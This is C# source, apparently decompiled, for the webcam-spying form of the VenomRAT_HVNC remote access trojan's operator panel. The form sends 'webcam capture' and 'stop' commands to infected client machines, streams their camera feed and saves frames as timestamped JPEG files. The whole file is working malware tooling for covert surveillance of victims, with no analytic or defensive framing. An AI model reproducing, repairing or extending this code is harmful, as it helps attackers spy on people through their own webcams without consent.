using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using VenomRAT_HVNC.Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Properties;
using VenomRAT_HVNC.Server.Connection;

using VenomRAT_HVNC.Server.Properties;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x0200008A RID: 138
    public partial class FormWebcam : Form
    {
        // Token: 0x170000DD RID: 221
        // (get) Token: 0x0600051A RID: 1306 RVA: 0x0003CDE9 File Offset: 0x0003CDE9
        // (set) Token: 0x0600051B RID: 1307 RVA: 0x0003CDF1 File Offset: 0x0003CDF1
        public Form1 F { get; set; }

        // Token: 0x170000DE RID: 222
        // (get) Token: 0x0600051C RID: 1308 RVA: 0x0003CDFA File Offset: 0x0003CDFA
        // (set) Token: 0x0600051D RID: 1309 RVA: 0x0003CE02 File Offset: 0x0003CE02
        internal Clients Client { get; set; }

        // Token: 0x170000DF RID: 223
        // (get) Token: 0x0600051E RID: 1310 RVA: 0x0003CE0B File Offset: 0x0003CE0B
        // (set) Token: 0x0600051F RID: 1311 RVA: 0x0003CE13 File Offset: 0x0003CE13
        internal Clients ParentClient { get; set; }

        // Token: 0x170000E0 RID: 224
        // (get) Token: 0x06000520 RID: 1312 RVA: 0x0003CE1C File Offset: 0x0003CE1C
        // (set) Token: 0x06000521 RID: 1313 RVA: 0x0003CE24 File Offset: 0x0003CE24
        public string FullPath { get; set; }

        // Token: 0x170000E1 RID: 225
        // (get) Token: 0x06000522 RID: 1314 RVA: 0x0003CE2D File Offset: 0x0003CE2D
        // (set) Token: 0x06000523 RID: 1315 RVA: 0x0003CE35 File Offset: 0x0003CE35
        public Image GetImage { get; set; }

        // Token: 0x06000524 RID: 1316 RVA: 0x0003CE3E File Offset: 0x0003CE3E
        public FormWebcam()
        {
            this.InitializeComponent();
        }

        // Token: 0x06000525 RID: 1317 RVA: 0x0003CE58 File Offset: 0x0003CE58
        private void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.button1.Tag == "play")
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "webcam";
                    msgPack.ForcePathObject("Command").AsString = "capture";
                    msgPack.ForcePathObject("List").AsInteger = (long)this.comboBox1.SelectedIndex;
                    msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value);
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                    this.button1.Tag = "stop";
                    this.button1.BackgroundImage = Resources.stop__1_;
                    this.numericUpDown1.Enabled = false;
                    this.comboBox1.Enabled = false;
                    this.btnSave.Enabled = true;
                }
                else
                {
                    this.button1.Tag = "play";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "webcam";
                    msgPack2.ForcePathObject("Command").AsString = "stop";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
                    this.button1.BackgroundImage = Resources.play_button;
                    this.btnSave.BackgroundImage = Resources.save_image;
                    this.numericUpDown1.Enabled = true;
                    this.comboBox1.Enabled = true;
                    this.btnSave.Enabled = false;
                    this.timerSave.Stop();
                }
            }
            catch
            {
            }
        }

        // Token: 0x06000526 RID: 1318 RVA: 0x0003D01C File Offset: 0x0003D01C
        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        // Token: 0x06000527 RID: 1319 RVA: 0x0003D070 File Offset: 0x0003D070
        private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                ThreadPool.QueueUserWorkItem(delegate (object o)
                {
                    Clients client = this.Client;
                    if (client == null)
                    {
                        return;
                    }
                    client.Disconnected();
                });
            }
            catch
            {
            }
        }

        // Token: 0x06000528 RID: 1320 RVA: 0x0003D0A4 File Offset: 0x0003D0A4
        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (this.button1.Tag == "stop")
            {
                if (this.SaveIt)
                {
                    this.SaveIt = false;
                    this.btnSave.BackgroundImage = Resources.save_image;
                    return;
                }
                this.btnSave.BackgroundImage = Resources.save_image2;
                try
                {
                    if (!Directory.Exists(this.FullPath))
                    {
                        Directory.CreateDirectory(this.FullPath);
                    }
                    Process.Start(this.FullPath);
                }
                catch
                {
                }
                this.SaveIt = true;
            }
        }

        // Token: 0x06000529 RID: 1321 RVA: 0x0003D134 File Offset: 0x0003D134
        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(this.FullPath))
                {
                    Directory.CreateDirectory(this.FullPath);
                }
                this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
            }
            catch
            {
            }
        }

        // Token: 0x040004B7 RID: 1207
        public Stopwatch sw = Stopwatch.StartNew();

        // Token: 0x040004B8 RID: 1208
        public int FPS;

        // Token: 0x040004B9 RID: 1209
        public bool SaveIt;
    }
}